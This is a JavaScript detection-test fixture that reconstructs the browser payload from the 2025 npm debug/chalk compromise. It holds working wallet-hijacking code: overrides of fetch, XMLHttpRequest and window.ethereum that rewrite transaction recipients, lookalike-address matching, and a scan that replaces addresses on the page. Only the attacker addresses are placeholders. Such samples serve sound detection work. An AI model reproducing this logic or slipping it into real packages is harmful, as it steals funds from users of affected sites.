// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// npm debug/chalk Compromise (Sep 2025): Browser-side Wallet Hijacking
// Source: Aikido "npm debug and chalk packages compromised"
// Pattern: fetch/XHR/ethereum override, RPC method interception, address replacement

(function() {
    // Attacker-controlled replacement addresses (SANITIZED - fake addresses)
    const ETHEREUM_ADDRESSES = [
        '0x0000000000000000000000000000000000000001',
        '0x0000000000000000000000000000000000000002',
        '0x0000000000000000000000000000000000000003'
    ];
    
    const BITCOIN_ADDRESSES = [
        '1000000000000000000000000000000001',
        '1000000000000000000000000000000002'
    ];
    
    const SOLANA_ADDRESSES = [
        '11111111111111111111111111111111',
        '22222222222222222222222222222222'
    ];
    
    // ERC20 function selectors
    const ERC20_SELECTORS = {
        approve: '0x095ea7b3',
        transfer: '0xa9059cbb',
        transferFrom: '0x23b872dd'
    };
    
    // Crypto address regex patterns
    const ADDRESS_PATTERNS = {
        ethereum: /\b0x[a-fA-F0-9]{40}\b/g,
        bitcoin: /\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g,
        solana: /\b[1-9A-HJ-NP-Za-km-z]{32,44}\b/g
    };
    
    // Levenshtein distance for lookalike address matching
    function levenshteinDistance(a, b) {
        const matrix = [];
        for (let i = 0; i <= b.length; i++) matrix[i] = [i];
        for (let j = 0; j <= a.length; j++) matrix[0][j] = j;
        
        for (let i = 1; i <= b.length; i++) {
            for (let j = 1; j <= a.length; j++) {
                if (b.charAt(i - 1) === a.charAt(j - 1)) {
                    matrix[i][j] = matrix[i - 1][j - 1];
                } else {
                    matrix[i][j] = Math.min(
                        matrix[i - 1][j - 1] + 1,
                        matrix[i][j - 1] + 1,
                        matrix[i - 1][j] + 1
                    );
                }
            }
        }
        return matrix[b.length][a.length];
    }
    
    // Find replacement address with Levenshtein matching
    function findReplacementAddress(address) {
        for (const target of ETHEREUM_ADDRESSES) {
            if (levenshteinDistance(address.toLowerCase(), target.toLowerCase()) <= 2) {
                return target;
            }
        }
        // Default: replace with first attacker address
        return ETHEREUM_ADDRESSES[0];
    }
    
    // Override global fetch
    const originalFetch = window.fetch;
    window.fetch = async function(url, options = {}) {
        // Intercept and potentially modify response
        const response = await originalFetch.call(this, url, options);
        const clonedResponse = response.clone();
        
        try {
            const json = await clonedResponse.json();
            // Check for addresses in response and replace
            if (json.result && ADDRESS_PATTERNS.ethereum.test(json.result)) {
                json.result = json.result.replace(
                    ADDRESS_PATTERNS.ethereum,
                    findReplacementAddress
                );
            }
        } catch (e) {
            // Not JSON, ignore
        }
        
        return response;
    };
    
    // Override XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._method = method;
        this._url = url;
        return originalXHROpen.apply(this, [method, url, ...args]);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        // Intercept RPC method calls
        if (body && typeof body === 'string') {
            try {
                const data = JSON.parse(body);
                if (data.method === 'eth_sendTransaction' || data.method === 'solana_signTransaction') {
                    // Modify transaction recipient
                    if (data.params && data.params[0] && data.params[0].to) {
                        data.params[0].to = findReplacementAddress(data.params[0].to);
                    }
                }
                body = JSON.stringify(data);
            } catch (e) {
                // Not JSON
            }
        }
        return originalXHRSend.call(this, body);
    };
    
    // Hook window.ethereum (MetaMask, etc.)
    if (window.ethereum) {
        const originalRequest = window.ethereum.request;
        const originalSend = window.ethereum.send;
        const originalSendAsync = window.ethereum.sendAsync;
        
        window.ethereum.request = async function(request) {
            if (request.method === 'eth_sendTransaction' || request.method === 'eth_signTransaction') {
                if (request.params && request.params[0] && request.params[0].to) {
                    request.params[0].to = findReplacementAddress(request.params[0].to);
                }
            }
            return originalRequest.call(this, request);
        };
        
        window.ethereum.send = function(request) {
            if (request.method === 'eth_sendTransaction') {
                if (request.params && request.params[0] && request.params[0].to) {
                    request.params[0].to = findReplacementAddress(request.params[0].to);
                }
            }
            return originalSend.call(this, request);
        };
        
        window.ethereum.sendAsync = function(request, callback) {
            if (request.method === 'eth_sendTransaction') {
                if (request.params && request.params[0] && request.params[0].to) {
                    request.params[0].to = findReplacementAddress(request.params[0].to);
                }
            }
            return originalSendAsync.call(this, request, callback);
        };
        
        // Expose control object
        window.stealthProxyControl = {
            enabled: true,
            addresses: ETHEREUM_ADDRESSES
        };
    }
    
    // Scan and replace addresses in page content
    function scanAndReplaceAddresses() {
        document.querySelectorAll('*').forEach(el => {
            if (el.textContent) {
                for (const [type, pattern] of Object.entries(ADDRESS_PATTERNS)) {
                    if (pattern.test(el.textContent)) {
                        el.textContent = el.textContent.replace(pattern, (match) => {
                            if (type === 'ethereum') return findReplacementAddress(match);
                            return match;
                        });
                    }
                }
            }
        });
    }
    
    // Run on DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', scanAndReplaceAddresses);
    } else {
        scanAndReplaceAddresses();
    }
})();
